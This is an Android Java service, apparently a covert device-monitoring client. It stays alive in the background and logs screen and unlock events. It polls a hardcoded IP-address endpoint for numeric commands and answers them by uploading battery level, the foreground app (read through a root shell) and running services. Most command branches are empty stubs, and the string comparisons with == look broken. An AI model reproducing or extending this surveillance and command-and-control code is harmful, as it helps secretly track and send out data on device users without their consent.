package com.example.administrator.myapplication;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaPlayer;
import android.os.IBinder;
import android.util.Log;

import com.example.administrator.myapplication.Love.Http;
import com.example.administrator.myapplication.Love.ScreenListener;
import com.xdandroid.hellodaemon.AbsWorkService;

import java.util.List;
import java.util.concurrent.TimeUnit;

import eu.chainfire.libsuperuser.Shell;
import io.reactivex.Flowable;
import io.reactivex.disposables.Disposable;

public class TraceServiceImpl extends AbsWorkService {

    private int intLevel;
    private long l;
    private long K;
    private long J;
    private String wen;
    private MediaPlayer player = null;
    //是否 任务完成, 不再需要服务运行?
    public static boolean sShouldStopService;
    public static Disposable sDisposable;

    public static void stopService() {
        //我们现在不再需要服务运行了, 将标志位置为 true
        sShouldStopService = true;
        //取消对任务的订阅
        if (sDisposable != null) sDisposable.dispose();
        //取消 Job / Alarm / Subscription
        cancelJobAlarmSub();
    }

    /**
     * 是否 任务完成, 不再需要服务运行?
     * @return 应当停止服务, true; 应当启动服务, false; 无法判断, 什么也不做, null.
     */
    @Override
    public Boolean shouldStopService(Intent intent, int flags, int startId) {
        return sShouldStopService;
    }

    @Override
    public void startWork(Intent intent, int flags, int startId) {
        //电量
        registerReceiver(mBatInfoReceiver, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        //获取屏幕状态
        ScreenListener screenListener = new ScreenListener(App.getContextObject());
        screenListener.begin(new ScreenListener.ScreenStateListener() {
            @Override
            public void onScreenOn() {
                System.out.println("屏幕打开了");
                K = System.currentTimeMillis();
                System.out.println("开始的时间是"+K);
            }
            @Override
            public void onScreenOff() {
                J = System.currentTimeMillis()-K;
                System.out.println("这次亮屏时间是"+J);
                System.out.println("屏幕关闭了");
            }
            @Override
            public void onUserPresent() {
                System.out.println("解锁了");
            }
        });

        System.out.println("检查磁盘中是否有上次销毁时保存的数据");

        sDisposable = Flowable
                .interval(3, TimeUnit.SECONDS)
                //取消任务时取消定时唤醒
                .doOnCancel(() -> {
                    System.out.println("保存数据到磁盘。");
                    cancelJobAlarmSub();
                })
                .subscribe(count -> {

                    //每隔3秒要做的事情
                    System.out.println("每3秒运行一次... count = " + count);

                    //每隔30秒要做的事情
                    if (count > 0 && count % 10 == 0) {

                        //连接网络
                        wen = new Http().Post("39.108.113.219/Management/M.php","text=","lundun:"+System.currentTimeMillis());

                        if (wen == "1"){
                            //电量
                            registerReceiver(mBatInfoReceiver, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
                            //返回一个电量信息给服务器
                            new Http().Post("39.108.113.219/Management/M.php","text=","电量是:"+intLevel);
                        }else if(wen == "2"){
                            //获取当前界面包名
                            List<String> run = Shell.SU.run("dumpsys activity top ");
                            System.out.println("当前界面的包名"+run.get(1));
                            //返回当前界面包名给服务器
                            new Http().Post("39.108.113.219/Management/M.php","text=","当前界面包名:"+run.get(1));
                        }else if(wen == "3"){

                            //获取服务
                            ActivityManager mActivityManager = (ActivityManager)getSystemService(ACTIVITY_SERVICE);
                            List<ActivityManager.RunningServiceInfo> mServiceList = mActivityManager.getRunningServices(100);
                            String res = "";
                            for(int i=0;i<mServiceList.size();++i){
                                res +=mServiceList.get(i).service.getClassName()+"\n";
                            }
                            System.out.println("手机正在运行中服务"+res);
                            //返回一个电量信息给服务器
                            new Http().Post("39.108.113.219/Management/M.php","text=","手机正在运行中服务:"+res);

                        }else if(wen == "4"){

                        }else if(wen == "5"){

                        }else if(wen == "6"){

                        }else if(wen == "7"){

                        }else if(wen == "8"){

                        }else if(wen == "9"){

                        }else if(wen == "10"){

                        }else if(wen == "11"){

                        }else if(wen == "12"){

                        }else if(wen == "13"){

                        }else if(wen == "14"){

                        }else if(wen == "15"){

                        }else if(wen == "16"){

                        }else if(wen == "17"){

                        }else if(wen == "18"){

                        }else if(wen == "19"){

                        }else if(wen == "20"){

                        }


                        //电池电量的
//                        registerReceiver(mBatInfoReceiver, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
                        //获取当界面
//                        List<String> run = Shell.SU.run("dumpsys activity top ");
//                        System.out.println("当前界面的包名"+run.get(1));
                        //获取服务
//                        ActivityManager mActivityManager = (ActivityManager)getSystemService(ACTIVITY_SERVICE);
//                        List<ActivityManager.RunningServiceInfo> mServiceList = mActivityManager.getRunningServices(100);
//                        String res = "";
//                        for(int i=0;i<mServiceList.size();++i){
//                            res +=mServiceList.get(i).service.getClassName()+"\n";
//                        }
//                        System.out.println("手机正在运行中服务"+res);

                        System.out.println("每30秒运行一次...。 saveCount = " + (count / 10 - 1));

                    }

                    //每隔180秒要做的事情
                    if (count > 0 && count % 60 == 0) {
                        new Http().Post("39.108.113.219/Management/M.php","text=","Android:"+System.currentTimeMillis());
                        System.out.println("每180秒运行一次...。 saveCount = " + (count / 60 - 1));
                    }

                });
    }

    @Override
    public void stopWork(Intent intent, int flags, int startId) {
        stopService();
    }

    /**
     * 任务是否正在运行?
     * @return 任务正在运行, true; 任务当前不在运行, false; 无法判断, 什么也不做, null.
     */
    @Override
    public Boolean isWorkRunning(Intent intent, int flags, int startId) {
        //若还没有取消订阅, 就说明任务仍在运行.
        return sDisposable != null && !sDisposable.isDisposed();
    }

    @Override
    public IBinder onBind(Intent intent, Void v) {
        return null;
    }

    @Override
    public void onServiceKilled(Intent rootIntent) {
        System.out.println("保存数据到磁盘。");
    }

    /* 创建BroadcastReceiver */
    private BroadcastReceiver mBatInfoReceiver=new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            /* 如果捕捉到的action是ACTION_BATTERY_CHANGED，
             * 就运行onBatteryInfoReceiver() */
            if (Intent.ACTION_BATTERY_CHANGED.equals(action)) {
                intLevel = intent.getIntExtra("level", 0);
                int intScale = intent.getIntExtra("scale", 100);
                Log.i("电量是", "" +intLevel );
                Log.i("电量", "" +intScale );

                if (intLevel < 20 && player == null){
                    if (System.currentTimeMillis()-l>28800000){
                        player = MediaPlayer.create(context,R.raw.kk);
                        player.start();
                        l = System.currentTimeMillis();
                        player = null;
                    }
                }

            }
        }
    };



}


























